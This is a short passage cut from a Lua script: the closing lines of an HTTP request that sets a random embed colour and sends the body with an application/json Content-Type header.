                color = math.random(0, 16776960)
        }
}
}), {
["Content-Type"] = "application/json"
})
end
